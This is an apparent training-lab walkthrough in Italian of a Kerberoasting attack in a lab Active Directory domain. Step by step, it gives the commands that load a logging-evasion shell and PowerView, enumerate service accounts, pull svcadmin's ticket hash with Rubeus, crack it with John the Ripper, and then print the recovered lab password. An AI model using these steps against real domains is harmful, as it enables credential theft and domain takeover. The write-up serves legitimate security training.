# LEARNING OBJECTIVE14

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Using the Kerberoasting attack, crack password of a SQL server service\
  account.

### SVOLGIMENTO

Per prima cosa dobbiamo individuare i servizi in esecuzione con account utente, poiché quelli in esecuzione con account macchina hanno password complesse. Per individuare tali servizi possiamo utilizzare PowerView (Get-DomainUser -SPN) o il modulo ActiveDirectory:

Lanciamo un prompt semplice, eseguiamo InviShell e PowerView&#x20;

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```powershell
. C:\AD\Tools\PowerView.ps1
```

```powershell
 Get-DomainUser -SPN
```

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Abbiamo individuato i seguenti utenti e SPN

* websvc --> {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}
* svcadmin --> {MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433, MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}

Fantastico! L'svcadmin, che è un amministratore di dominio, ha un SPN impostato! Facciamo un Kerberoast!

Possiamo usare Rubeus per ottenere gli hash dell'account svcadmin. Si noti che stiamo usando l'opzione /rc4opsec che ottiene gli hash solo per gli account che supportano RC4. Ciò significa che se per un account di servizio è impostato “Questo account supporta la crittografia Kerberos AES a 128/256 bit”, il comando riportato di seguito non richiederà i relativi hash.

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.tx
```

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Ora possiamo usare John the Ripper per forzare gli hash con la forza bruta. Si prega di notare che è necessario rimuovere “:1433” dall'SPN in hashes.txt prima di eseguire John&#x20;

$krb5tgs$23$_svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorpmgmt.dollarcorp.moneycorp.local :1433\*_&#x20;

dovrebbe essere&#x20;

$krb5tgs$23$_svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorpmgmt.dollarcorp.moneycorp.local\*_&#x20;

in hashes.txt

Esegui il comando seguente dopo aver apportato le modifiche sopra indicate

```
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Password svcadmin --> \*ThisisBlasphemyThisisMadness!!
